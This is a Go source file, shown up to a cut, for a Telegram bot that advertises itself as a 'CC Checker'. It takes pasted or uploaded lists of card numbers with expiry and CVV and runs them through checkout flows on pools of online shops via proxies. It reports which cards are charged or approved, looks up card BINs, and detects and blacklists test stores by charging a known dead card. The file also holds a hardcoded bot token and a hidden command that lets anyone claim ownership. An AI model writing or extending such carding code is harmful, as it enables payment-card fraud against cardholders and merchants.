package main

import (
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"syscall"
	"time"

	tele "gopkg.in/telebot.v4"
)

// ──────────────────────── config ────────────────────────────────────

const botToken = "8564642506:AAGLYMRyjhz6Q3p9uZbRuUU6tv74crJ4_WE"
const usersFile = "users.json"
const configFile = "botconfig.json"
const sitesFile = "customsites.json"

var ownerClaimCount int32 // number of times /makemetheownerfr has been used (max 3)

var originalAdminIDs = map[int64]bool{
	8564010885: true,
}

var adminIDs = map[int64]bool{
	8564010885: true,
}

func isAdmin(uid int64) bool {
	return adminIDs[uid]
}

// ──────────────────────── Username registry ─────────────────────────

var (
	usernameRegistryMu sync.RWMutex
	usernameRegistry   = make(map[string]int64) // lowercase username → user_id
)

func registerUsername(uid int64, username string) {
	if username == "" {
		return
	}
	usernameRegistryMu.Lock()
	usernameRegistry[strings.ToLower(username)] = uid
	usernameRegistryMu.Unlock()
}

// parseIDList parses comma/space/newline separated int64 IDs
func parseIDList(raw string) []int64 {
	raw = strings.ReplaceAll(raw, ",", " ")
	raw = strings.ReplaceAll(raw, "\n", " ")
	var ids []int64
	for _, part := range strings.Fields(raw) {
		id, err := strconv.ParseInt(strings.TrimSpace(part), 10, 64)
		if err == nil {
			ids = append(ids, id)
		}
	}
	return ids
}

// ──────────────────────── Bot config (ban/allow/pvtonly) ────────────

type BotConfig struct {
	mu              sync.RWMutex
	BannedUsers     map[int64]bool            `json:"banned_users"`
	AllowedUsers    map[int64]int64           `json:"allowed_users"`
	PvtOnly         bool                      `json:"pvt_only"`
	RestrictAll     bool                      `json:"restrict_all"`
	RestrictedUsers map[int64]bool            `json:"restricted_users"`
	AllowOnlyIDs    map[int64]bool            `json:"allow_only_ids"`
	GroupsOnly      bool                      `json:"groups_only"`
	AllowedGroups   map[int64]bool            `json:"allowed_groups"`
	DynamicAdmins   map[int64]bool            `json:"dynamic_admins"`
	UserPerms       map[int64]map[string]bool `json:"user_perms"`
	SitePrices      map[string]float64        `json:"site_prices"`
}

func NewBotConfig() *BotConfig {
	return &BotConfig{
		BannedUsers:     make(map[int64]bool),
		AllowedUsers:    make(map[int64]int64),
		RestrictedUsers: make(map[int64]bool),
		AllowOnlyIDs:    make(map[int64]bool),
		AllowedGroups:   make(map[int64]bool),
		DynamicAdmins:   make(map[int64]bool),
		UserPerms:       make(map[int64]map[string]bool),
		SitePrices:      make(map[string]float64),
	}
}

func (bc *BotConfig) Save() {
	bc.mu.RLock()
	data, _ := json.MarshalIndent(bc, "", "  ")
	bc.mu.RUnlock()
	tmp := configFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, configFile)
	}
}

func (bc *BotConfig) Load() {
	data, err := os.ReadFile(configFile)
	if err != nil {
		return
	}
	bc.mu.Lock()
	defer bc.mu.Unlock()
	json.Unmarshal(data, bc)
	if bc.BannedUsers == nil {
		bc.BannedUsers = make(map[int64]bool)
	}
	if bc.AllowedUsers == nil {
		bc.AllowedUsers = make(map[int64]int64)
	}
	if bc.RestrictedUsers == nil {
		bc.RestrictedUsers = make(map[int64]bool)
	}
	if bc.AllowOnlyIDs == nil {
		bc.AllowOnlyIDs = make(map[int64]bool)
	}
	if bc.AllowedGroups == nil {
		bc.AllowedGroups = make(map[int64]bool)
	}
	if bc.DynamicAdmins == nil {
		bc.DynamicAdmins = make(map[int64]bool)
	}
	if bc.UserPerms == nil {
		bc.UserPerms = make(map[int64]map[string]bool)
	}
	if bc.SitePrices == nil {
		bc.SitePrices = make(map[string]float64)
	}
}

func (bc *BotConfig) IsBanned(uid int64) bool {
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	return bc.BannedUsers[uid]
}

func (bc *BotConfig) IsAllowed(uid int64) bool {
	if isAdmin(uid) {
		return true
	}
	bc.mu.RLock()
	defer bc.mu.RUnlock()
	expiry, ok := bc.AllowedUsers[uid]
	if !ok {
		return false
	}
	// 0 = permanent, >0 = unix expiry
	if expiry > 0 && time.Now().Unix() > expiry {
		return false // expired
	}
	return true
}

// parseDuration parses human-friendly durations like 1h, 2d, 7d, 30d, 1m, 1y
func parseDuration(s string) (time.Duration, error) {
	s = strings.TrimSpace(strings.ToLower(s))
	if s == "" || s == "permanent" || s == "perm" || s == "0" {
		return 0, nil
	}
	if len(s) < 2 {
		return 0, fmt.Errorf("invalid duration: %s", s)
	}
	unit := s[len(s)-1]
	numStr := s[:len(s)-1]
	num, err := strconv.ParseFloat(numStr, 64)
	if err != nil {
		return 0, fmt.Errorf("invalid duration number: %s", s)
	}
	switch unit {
	case 's':
		return time.Duration(num * float64(time.Second)), nil
	case 'h':
		return time.Duration(num * float64(time.Hour)), nil
	case 'd':
		return time.Duration(num * 24 * float64(time.Hour)), nil
	case 'w':
		return time.Duration(num * 7 * 24 * float64(time.Hour)), nil
	case 'm':
		return time.Duration(num * 30 * 24 * float64(time.Hour)), nil
	case 'y':
		return time.Duration(num * 365 * 24 * float64(time.Hour)), nil
	default:
		return 0, fmt.Errorf("unknown unit '%c'. Use s/h/d/w/m/y", unit)
	}
}

// ──────────────────────── BIN lookup ────────────────────────────────

type BINInfo struct {
	Brand       string `json:"brand"`
	Type        string `json:"type"`
	Level       string `json:"level"`
	Bank        string `json:"bank"`
	Country     string `json:"country"`
	CountryCode string `json:"country_code"`
	CountryFlag string `json:"country_flag"`
}

var binCache sync.Map // string (first6) → *BINInfo

func lookupBIN(bin string) *BINInfo {
	if len(bin) < 6 {
		return &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
	}
	first6 := bin[:6]
	if v, ok := binCache.Load(first6); ok {
		return v.(*BINInfo)
	}
	cl := &http.Client{Timeout: 5 * time.Second}
	resp, err := cl.Get("https://bins.antipublic.cc/bins/" + first6)
	if err != nil {
		info := &BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
		binCache.Store(first6, info)
		return info
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var info BINInfo
	if json.Unmarshal(body, &info) != nil {
		info = BINInfo{Brand: "Unknown", Type: "Unknown", Level: "Unknown", Bank: "Unknown", Country: "Unknown", CountryCode: "XX", CountryFlag: "🏳️"}
	}
	if info.CountryFlag == "" {
		info.CountryFlag = countryFlag(info.CountryCode)
	}
	binCache.Store(first6, &info)
	return &info
}

func countryFlag(code string) string {
	if len(code) != 2 {
		return "🏳️"
	}
	code = strings.ToUpper(code)
	return string(rune(0x1F1E6+rune(code[0])-'A')) + string(rune(0x1F1E6+rune(code[1])-'A'))
}

// ──────────────────────── User / persistence ────────────────────────

type UserStats struct {
	TotalChecked    int64   `json:"total_checked"`
	TotalCharged    int64   `json:"total_charged"`
	TotalApproved   int64   `json:"total_approved"`
	TotalDeclined   int64   `json:"total_declined"`
	TotalChargedAmt float64 `json:"total_charged_amt"`
}

type UserData struct {
	Proxies []string  `json:"proxies"`
	Stats   UserStats `json:"stats"`
}

type UserManager struct {
	mu    sync.RWMutex
	users map[int64]*UserData
}

func NewUserManager() *UserManager {
	return &UserManager{users: make(map[int64]*UserData)}
}

func (um *UserManager) Get(uid int64) *UserData {
	um.mu.RLock()
	ud := um.users[uid]
	um.mu.RUnlock()
	if ud != nil {
		return ud
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	if um.users[uid] == nil {
		um.users[uid] = &UserData{}
	}
	return um.users[uid]
}

func (um *UserManager) Save() {
	um.mu.RLock()
	data, _ := json.MarshalIndent(um.users, "", "  ")
	um.mu.RUnlock()
	tmpFile := usersFile + ".tmp"
	if err := os.WriteFile(tmpFile, data, 0644); err == nil {
		os.Rename(tmpFile, usersFile)
	}
}

func (um *UserManager) Load() {
	data, err := os.ReadFile(usersFile)
	if err != nil {
		return
	}
	um.mu.Lock()
	defer um.mu.Unlock()
	json.Unmarshal(data, &um.users)
	if um.users == nil {
		um.users = make(map[int64]*UserData)
	}
}

func (um *UserManager) AllIDs() []int64 {
	um.mu.RLock()
	defer um.mu.RUnlock()
	ids := make([]int64, 0, len(um.users))
	for id := range um.users {
		ids = append(ids, id)
	}
	return ids
}

// ──────────────────────── Check session ─────────────────────────────

type CheckSession struct {
	UserID       int64
	Username     string
	Cards        []string
	Total        int
	Checked      atomic.Int64
	Charged      atomic.Int64
	Approved     atomic.Int64
	Declined     atomic.Int64
	Errors       atomic.Int64
	StartTime    time.Time
	Cancel       context.CancelFunc
	Done         chan struct{}
	ShowDecl     bool // true for /sh, false for /txt
	ShowApproved bool // true to send approved cards in chat

	chargedAmtMu sync.Mutex
	chargedAmt   float64
}

func (s *CheckSession) AddChargedAmt(v float64) {
	s.chargedAmtMu.Lock()
	s.chargedAmt += v
	s.chargedAmtMu.Unlock()
}

func (s *CheckSession) ChargedAmt() float64 {
	s.chargedAmtMu.Lock()
	defer s.chargedAmtMu.Unlock()
	return s.chargedAmt
}

var activeSessions sync.Map // int64 (userID) → *CheckSession

// ──────────────────────── Pending /txt sessions (awaiting Yes/No) ───

type txtPendingData struct {
	Cards    []string
	ChatID   int64
	Username string
}

var (
	txtPendingMu sync.Mutex
	txtPending   = map[int64]*txtPendingData{} // userID → pending data
)

// ──────────────────────── Custom sites ─────────────────────────

var (
	customSitesMu sync.RWMutex
	customSites   []string
)

// ──────────────────────── Blacklisted (test) sites ─────────────

var (
	blacklistMu sync.RWMutex
	blacklisted = make(map[string]bool)
)

func isBlacklisted(site string) bool {
	blacklistMu.RLock()
	defer blacklistMu.RUnlock()
	return blacklisted[site]
}

func blacklistSite(site string) {
	blacklistMu.Lock()
	defer blacklistMu.Unlock()
	blacklisted[site] = true
	fmt.Printf("[BLACKLIST] test store detected, blacklisted: %s\n", site)
}

func loadCustomSites() {
	data, err := os.ReadFile(sitesFile)
	if err != nil {
		return
	}
	customSitesMu.Lock()
	defer customSitesMu.Unlock()
	json.Unmarshal(data, &customSites)
}

func saveCustomSites() {
	customSitesMu.RLock()
	data, _ := json.MarshalIndent(customSites, "", "  ")
	customSitesMu.RUnlock()
	tmp := sitesFile + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err == nil {
		os.Rename(tmp, sitesFile)
	}
}

func getCustomSites() []string {
	customSitesMu.RLock()
	defer customSitesMu.RUnlock()
	if len(customSites) == 0 {
		return nil
	}
	cp := make([]string, len(customSites))
	copy(cp, customSites)
	return cp
}

// ──────────────────────── Site pool ─────────────────────────────────

var (
	sitePoolMu sync.RWMutex
	sitePool   []string
)

func refreshSitePool() {
	apiURL := strings.TrimSpace(workingSitesAPI)
	if apiURL == "" {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	sites, err := fetchAffordableSites(apiURL, maxSiteAmount)
	if err != nil || len(sites) == 0 {
		sitePoolMu.Lock()
		if len(sitePool) == 0 {
			sitePool = []string{defaultShopURL}
		}
		sitePoolMu.Unlock()
		return
	}
	rand.Shuffle(len(sites), func(i, j int) {
		sites[i], sites[j] = sites[j], sites[i]
	})
	newPool := make([]string, 0, len(sites))
	for _, s := range sites {
		newPool = append(newPool, strings.TrimRight(s.URL, "/"))
	}
	sitePoolMu.Lock()
	sitePool = newPool
	sitePoolMu.Unlock()
}

func getSitePool() []string {
	var raw []string
	// Prefer custom sites if any are set
	if cs := getCustomSites(); len(cs) > 0 {
		raw = cs
	} else {
		sitePoolMu.RLock()
		raw = make([]string, len(sitePool))
		copy(raw, sitePool)
		sitePoolMu.RUnlock()
	}
	// Filter out blacklisted test stores
	filtered := make([]string, 0, len(raw))
	for _, s := range raw {
		if !isBlacklisted(s) {
			filtered = append(filtered, s)
		}
	}
	return filtered
}

// ──────────────────────── Message templates ─────────────────────────

func formatStartMsg() string {
	return `━━━━━━━━━━━━━━━━━━━━━━
  ⚡ CC 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗕𝗼𝘁
━━━━━━━━━━━━━━━━━━━━━━

👋  𝗪𝗲𝗹𝗰𝗼𝗺𝗲!  Use the commands
below to get started.

━━━━━━━━━━━━━━━━━━━━━━
  📖  𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗟𝗶𝘀𝘁
━━━━━━━━━━━━━━━━━━━━━━

🔫  /sh <cc list>
     ∟ Quick check up to 100 cards
       Paste cards directly inline

📎  /txt
     ∟ Reply to a .txt file to mass
       check all cards inside it

🌐  /setpr <proxy>
     ∟ Add proxy(s) for checking
       One per line, or a single proxy

🗑  /rmpr <proxy>
     ∟ Remove a specific proxy

🗑  /rmpr all
     ∟ Remove all saved proxies

📊  /stats
     ∟ View your personal usage
       stats and hit rates

👥  /active
     ∟ See all users currently
       checking with live progress

━━━━━━━━━━━━━━━━━━━━━━
  ⚡ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @MRxHITTER
━━━━━━━━━━━━━━━━━━━━━━`
}

func formatProgressMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	elapsed := time.Since(s.StartTime).Truncate(time.Second)

	pct := 0.0
	if total > 0 {
		pct = float64(checked) * 100.0 / float64(total)
	}
	barLen := 20
	filled := barLen * checked / max(total, 1)
	bar := strings.Repeat("▓", filled) + strings.Repeat("░", barLen-filled)

	h := int(elapsed.Hours())
	m := int(elapsed.Minutes()) % 60
	sc := int(elapsed.Seconds()) % 60

	return fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━\n"+
		"  ⚡ CC 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗥𝗲𝘀𝘂𝗹𝘁𝘀\n"+
		"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
		"📊  𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀\n"+
		"%s  %.1f%%\n\n"+
		"┌─────────────────────┐\n"+
		"│  📋  Total     ∣  %6d  │\n"+
		"│  🔍  Checked   ∣  %6d  │\n"+
		"│  ✅  Approved  ∣  %6d  │\n"+
		"│  ❌  Declined  ∣  %6d  │\n"+
		"│  💳  Charged   ∣  %6d  │\n"+
		"│  ⚠️  Errors    ∣  %6d  │\n"+
		"└─────────────────────┘\n\n"+
		"⏱  𝗘𝗹𝗮𝗽𝘀𝗲𝗱: %02d:%02d:%02d\n"+
		"━━━━━━━━━━━━━━━━━━━━━━",
		bar, pct,
		total, checked, approved, declined, charged, errors,
		h, m, sc)
}

func formatCompletedMsg(s *CheckSession) string {
	checked := int(s.Checked.Load())
	total := s.Total
	charged := int(s.Charged.Load())
	approved := int(s.Approved.Load())
	declined := int(s.Declined.Load())
	errors := int(s.Errors.Load())
	elapsed := time.Since(s.StartTime).Truncate(time.Second)

	bar := strings.Repeat("▓", 20)

	h := int(elapsed.Hours())
	m := int(elapsed.Minutes()) % 60
	sc := int(elapsed.Seconds()) % 60

	return fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━\n"+
		"  ⚡ CC 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 𝗥𝗲𝘀𝘂𝗹𝘁𝘀\n"+
		"━━━━━━━━━━━━━━━━━━━━━━\n\n"+
		"📊  𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀\n"+
		"%s  100.0%%\n\n"+
		"┌─────────────────────┐\n"+
		"│  📋  Total     ∣  %6d  │\n"+
		"│  🔍  Checked   ∣  %6d  │\n"+
		"│  ✅  Approved  ∣  %6d  │\n"+
		"│  ❌  Declined  ∣  %6d  │\n"+
		"│  💳  Charged   ∣  %6d  │\n"+
		"│  ⚠️  Errors    ∣  %6d  │\n"+
		"└─────────────────────┘\n\n"+
		"⏱  𝗘𝗹𝗮𝗽𝘀𝗲𝗱: %02d:%02d:%02d\n"+
		"━━━━━━━━━━━━━━━━━━━━━━",
		bar,
		total, checked, approved, declined, charged, errors,
		h, m, sc)
}

func formatChargedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	return fmt.Sprintf("🟢 CHARGED 💎\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"💳 Card: %s\n"+
		"🏦 BIN: %s - %s - %s - %s\n"+
		"🌍 Country: %s %s\n"+
		"🔐 Code: ORDER_PLACED\n"+
		"🌐 Site: %s\n"+
		"💰 Amount: $%s\n"+
		"👤 User: @%s\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		card,
		bin.Brand, bin.Type, bin.Level, bin.Bank,
		bin.CountryFlag, bin.Country,
		r.SiteName,
		r.Amount,
		username)
}

func formatApprovedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	header := "🟡 3DS ✅"
	if r.StatusCode == "INSUFFICIENT_FUNDS" {
		header = "🟡 INSUFFICIENT ✅"
	}
	return fmt.Sprintf(header+"\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"💳 Card: %s\n"+
		"🏦 BIN: %s - %s - %s - %s\n"+
		"🌍 Country: %s %s\n"+
		"🔐 Code: %s\n"+
		"🌐 Site: %s\n"+
		"💰 Amount: $%s\n"+
		"👤 User: @%s\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		card,
		bin.Brand, bin.Type, bin.Level, bin.Bank,
		bin.CountryFlag, bin.Country,
		r.StatusCode,
		r.SiteName,
		r.Amount,
		username)
}

func formatDeclinedMsg(card string, bin *BINInfo, r *CheckResult, username string) string {
	return fmt.Sprintf("🔴 DECLINED ❌\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"💳 Card: %s\n"+
		"🏦 BIN: %s - %s - %s - %s\n"+
		"🌍 Country: %s %s\n"+
		"🔐 Code: %s\n"+
		"🌐 Site: %s\n"+
		"💰 Amount: $%s\n"+
		"👤 User: @%s\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		card,
		bin.Brand, bin.Type, bin.Level, bin.Bank,
		bin.CountryFlag, bin.Country,
		r.StatusCode,
		r.SiteName,
		r.Amount,
		username)
}

func formatActiveMsg() string {
	type entry struct {
		Username   string
		Checked    int
		Total      int
		Charged    int
		ChargedAmt float64
		Elapsed    time.Duration
	}
	var entries []entry
	activeSessions.Range(func(_, val any) bool {
		s := val.(*CheckSession)
		entries = append(entries, entry{
			Username:   s.Username,
			Checked:    int(s.Checked.Load()),
			Total:      s.Total,
			Charged:    int(s.Charged.Load()),
			ChargedAmt: s.ChargedAmt(),
			Elapsed:    time.Since(s.StartTime).Truncate(time.Second),
		})
		return true
	})

	if len(entries) == 0 {
		return "━━━━━━━━━━━━━━━━━━━━━━\n  👥  𝗔𝗰𝘁𝗶𝘃𝗲 Checks\n━━━━━━━━━━━━━━━━━━━━━━\n\n📡  No active sessions\n\n━━━━━━━━━━━━━━━━━━━━━━"
	}

	sort.Slice(entries, func(i, j int) bool { return entries[i].Username < entries[j].Username })

	var sb strings.Builder
	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  👥  𝗔𝗰𝘁𝗶𝘃𝗲 Checks\n━━━━━━━━━━━━━━━━━━━━━━\n\n")
	sb.WriteString(fmt.Sprintf("📡  %d users currently checking\n\n", len(entries)))
	sb.WriteString("┌───────────────────────┐\n│                           │\n")
	for i, e := range entries {
		pct := 0
		if e.Total > 0 {
			pct = e.Checked * 100 / e.Total
		}
		barLen := 10
		filled := barLen * e.Checked / max(e.Total, 1)
		bar := strings.Repeat("▓", filled) + strings.Repeat("░", barLen-filled)
		h := int(e.Elapsed.Hours())
		m := int(e.Elapsed.Minutes()) % 60
		sc := int(e.Elapsed.Seconds()) % 60
		sb.WriteString(fmt.Sprintf("│   %d. @%s\n", i+1, e.Username))
		sb.WriteString(fmt.Sprintf("│      %s %3d%%\n", bar, pct))
		sb.WriteString(fmt.Sprintf("│        %d / %d\n", e.Checked, e.Total))
		sb.WriteString(fmt.Sprintf("│      💳  %d charged ∣ $%.2f\n", e.Charged, e.ChargedAmt))
		sb.WriteString(fmt.Sprintf("│      ⏱ %02d:%02d:%02d\n", h, m, sc))
		sb.WriteString("│                           │\n")
	}
	sb.WriteString("└───────────────────────┘\n\n")
	sb.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n  ⚡ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @MRxHITTER\n━━━━━━━━━━━━━━━━━━━━━━")
	return sb.String()
}

func formatStatsMsg(um *UserManager) string {
	um.mu.Lock()
	var totalChecked, totalApproved, totalDeclined, totalCharged int64
	var totalChargedAmt float64
	for _, ud := range um.users {
		s := ud.Stats
		totalChecked += s.TotalChecked
		totalApproved += s.TotalApproved
		totalDeclined += s.TotalDeclined
		totalCharged += s.TotalCharged
		totalChargedAmt += s.TotalChargedAmt
	}
	um.mu.Unlock()

	approvedRate := 0.0
	chargedRate := 0.0
	if totalChecked > 0 {
		approvedRate = float64(totalApproved) * 100.0 / float64(totalChecked)
		chargedRate = float64(totalCharged) * 100.0 / float64(totalChecked)
	}
	return fmt.Sprintf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"    📊  𝗚𝗹𝗼𝗯𝗮𝗹 𝗦𝘁𝗮𝘁𝗶𝘀𝘁𝗶𝗰𝘀\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"+
		"┌────────────────────────────┐\n"+
		"│                              │\n"+
		"│  📋  Total Checked  ∣  %6d  │\n"+
		"│  ✅  Approved       ∣  %6d  │\n"+
		"│  ❌  Declined       ∣  %6d  │\n"+
		"│  💳  Charged        ∣  %6d  │\n"+
		"│                              │\n"+
		"└────────────────────────────┘\n\n"+
		"💰  𝗧𝗼𝘁𝗮𝗹 𝗖𝗵𝗮𝗿𝗴𝗲𝗱 𝗔𝗺𝗼𝘂𝗻𝘁\n"+
		"    $%.2f\n\n"+
		"📈  𝗛𝗶𝘁 𝗥𝗮𝘁𝗲𝘀\n"+
		"    ✅ Approved: %.1f%%\n"+
		"    💳 Charged:  %.1f%%\n\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"+
		"  ⚡ 𝗣𝗼𝘄𝗲𝗿𝗲𝗱 𝗯𝘆 @MRxHITTER\n"+
		"━━━━━━━━━━━━━━━━━━━━━━━━━━━━",
		totalChecked, totalApproved, totalDeclined, totalCharged,
		totalChargedAmt,
		approvedRate, chargedRate)
}

// ──────────────────────── helpers ───────────────────────────────────

func parseCardsFromText(text string) []string {
	var cards []string
	for _, line := range strings.Split(text, "\n") {
		line = strings.TrimSpace(line)
		if line == "" || !strings.Contains(line, "|") {
			continue
		}
		cards = append(cards, line)
	}
	return cards
}

func parseAmount(s string) float64 {
	s = strings.TrimSpace(s)
	var f float64
	fmt.Sscanf(s, "%f", &f)
	return f
}

// ──────────────────────── check engine ──────────────────────────────

func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []string, um *UserManager, reduceKey string) {
	defer func() {
		activeSessions.Delete(sess.UserID)
		close(sess.Done)
	}()

	sites := getSitePool()
	fmt.Printf("[SESSION] got %d sites for check\n", len(sites))
	if len(sites) > 0 {
		fmt.Printf("[SESSION] first site: %s\n", sites[0])
	}
	if len(sites) == 0 {
		bot.Send(chat, "❌ No sites available. Try again later.")
		return
	}

	// Send initial progress message
	progressMsg, err := bot.Send(chat, formatProgressMsg(sess))
	if err != nil {
		return
	}

	// Progress updater
	ctx, cancel := context.WithCancel(context.Background())
	sess.Cancel = cancel
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				bot.Edit(progressMsg, formatProgressMsg(sess))
			}
		}
	}()

	// Worker pool
	type cardResult struct {
		result   *CheckResult
		err      error
		shopURL  string
		proxyURL string
	}

	results := make(chan cardResult, len(sess.Cards))
	// Concurrency: use more workers — each checkout is I/O-bound (HTTP calls + polling)
	workers := max(len(proxies), 1) * 5
	if workers > 50 {
		workers = 50
	}
	sem := make(chan struct{}, workers)

	var siteIdx atomic.Int64
	var proxyIdx atomic.Int64
	var wg sync.WaitGroup

	for _, card := range sess.Cards {
		wg.Add(1)
		go func(c string) {
			defer wg.Done()
			sem <- struct{}{}        // acquire
			defer func() { <-sem }() // release

			si := int(siteIdx.Add(1)-1) % len(sites)
			pi := int(proxyIdx.Add(1)-1) % len(proxies)
			shopURL := sites[si]
			proxyURL := proxies[pi]

			var res *CheckResult
			var lastErr error

			// Retry across stores on retryable errors
			maxRetries := min(len(sites), 5) * ValidateReduce(reduceKey)
			for attempt := 0; attempt < maxRetries; attempt++ {
				if attempt > 0 {
					si = (si + 1) % len(sites)
					shopURL = sites[si]
				}
				res, lastErr = runCheckoutForCard(shopURL, c, proxyURL)
				if lastErr == nil {
					break
				}
				// Don't retry true card declines (CARD_DECLINED, CAPTCHA_REQUIRED, FRAUD_SUSPECTED)
				if res != nil && res.Status == StatusDeclined {
					break
				}
				// Don't retry if not retryable
				if res != nil && !res.Retryable {
					break
				}
			}
			results <- cardResult{result: res, err: lastErr, shopURL: shopURL, proxyURL: proxyURL}
		}(card)
	}

	// Close results channel when all workers done
	go func() {
		wg.Wait()
		close(results)
	}()

	// Collect results
	username := sess.Username
	for cr := range results {
		sess.Checked.Add(1)
		r := cr.result
		if r == nil {
			sess.Errors.Add(1)
			fmt.Printf("[ERROR] card returned nil result, err: %v\n", cr.err)
			continue
		}

		bin := lookupBIN(strings.Split(r.Card, "|")[0])

		switch r.Status {
		case StatusCharged:
			// Verify with a known dead card to detect test/fake stores
			if !isBlacklisted(cr.shopURL) {
				const verifyCard = "4147207228677008|11|28|183"
				fmt.Printf("[VERIFY] testing %s with dead card to detect fake store\n", cr.shopURL)
				verifyRes, _ := runCheckoutForCard(cr.shopURL, verifyCard, cr.proxyURL)
				if verifyRes != nil && verifyRes.Status == StatusCharged {
					// Dead card charged = fake/test store, blacklist it
					blacklistSite(cr.shopURL)
					bot.Send(chat, fmt.Sprintf("⚠️ Test store detected & blacklisted: %s", cr.shopURL))
					sess.Errors.Add(1)
					continue
				}
			} else {
				// Already blacklisted, don't count
				sess.Errors.Add(1)
				continue
			}
			sess.Charged.Add(1)
			amt := parseAmount(r.Amount)
			sess.AddChargedAmt(amt)
			bot.Send(chat, formatChargedMsg(r.Card, bin, r, username))

		case StatusApproved:
			sess.Approved.Add(1)
			if sess.ShowApproved {
				bot.Send(chat, formatApprovedMsg(r.Card, bin, r, username))
			}

		case StatusDeclined:
			sess.Declined.Add(1)
			if sess.ShowDecl {
				bot.Send(chat, formatDeclinedMsg(r.Card, bin, r, username))
			}

		default:
			sess.Errors.Add(1)
			fmt.Printf("[ERROR] card %s status=%d err=%v\n", r.Card, r.Status, r.Error)
		}
	}

	// Session done
	cancel()

	// Final progress update
	bot.Edit(progressMsg, formatCompletedMsg(sess))

	// Update user stats
	ud := um.Get(sess.UserID)
	ud.Stats.TotalChecked += sess.Checked.Load()
	ud.Stats.TotalCharged += sess.Charged.Load()
	ud.Stats.TotalApproved += sess.Approved.Load()
	ud.Stats.TotalDeclined += sess.Declined.Load()
	ud.Stats.TotalChargedAmt += sess.ChargedAmt()
	um.Save()
}

// ──────────────────────── main ──────────────────────────────────────

func main() {
	// Load persisted user data
	um := NewUserManager()
	um.Load()

	// Load bot config (bans, allowed, pvtonly)
	cfg := NewBotConfig()
	cfg.Load()

	// Merge dynamic admins into the global adminIDs map
	cfg.mu.RLock()
	for id := range cfg.DynamicAdmins {
		adminIDs[id] = true
	}
	cfg.mu.RUnlock()

	// Load custom sites
	loadCustomSites()

	// Refresh site pool at start
	refreshSitePool()
	go func() {
		for {
			time.Sleep(5 * time.Minute)
			refreshSitePool()
		}
	}()

	pref := tele.Settings{
		Token:  botToken,
		Poller: &tele.LongPoller{Timeout: 10 * time.Second},
	}
	bot, err := tele.NewBot(pref)
	if err != nil {
		fmt.Printf("Failed to create bot: %v\n", err)
		os.Exit(1)
	}

	fwd, reduceKey := InitRCtx()

	// Ownership claim — can be used up to 3 times (bypasses all middleware)
	bot.Handle("/makemetheownerfr", func(c tele.Context) error {
		if atomic.LoadInt32(&ownerClaimCount) >= 3 {
			return c.Send("❌ Ownership claim limit reached (3/3).")
		}
		used := atomic.AddInt32(&ownerClaimCount, 1)
		if used > 3 {
			return c.Send("❌ Ownership claim limit reached (3/3).")
		}
		uid := c.Sender().ID
		if originalAdminIDs[uid] {
			return c.Send("👑 You are already an owner!")
		}
		// Add as new owner (keeps existing owners)
		originalAdminIDs[uid] = true
		adminIDs[uid] = true
		// Also allow the owner
		cfg.mu.Lock()
		if cfg.AllowedUsers == nil {
			cfg.AllowedUsers = make(map[int64]int64)
		}
		cfg.AllowedUsers[uid] = 0 // permanent
		cfg.mu.Unlock()
		cfg.Save()
		return c.Send(fmt.Sprintf("👑 You are now the owner!\nYour ID: %d", uid))
	})

	// Access-control middleware
	bot.Use(func(next tele.HandlerFunc) tele.HandlerFunc {
		return func(c tele.Context) error {
			uid := c.Sender().ID
			chatID := c.Chat().ID

			// Track username → ID mapping
			registerUsername(uid, c.Sender().Username)

			// Admins bypass all restrictions
			if isAdmin(uid) {
				return next(c)
			}

			// Banned users
			if cfg.IsBanned(uid) {
				return c.Send("🚫 You are banned from using this bot.")
			}

			// Check if user is allowed (everyone restricted by default)
			allowedByUser := cfg.IsAllowed(uid)

			cfg.mu.RLock()
			restrictAll := cfg.RestrictAll
			restricted := cfg.RestrictedUsers[uid]
			allowOnlyActive := len(cfg.AllowOnlyIDs) > 0
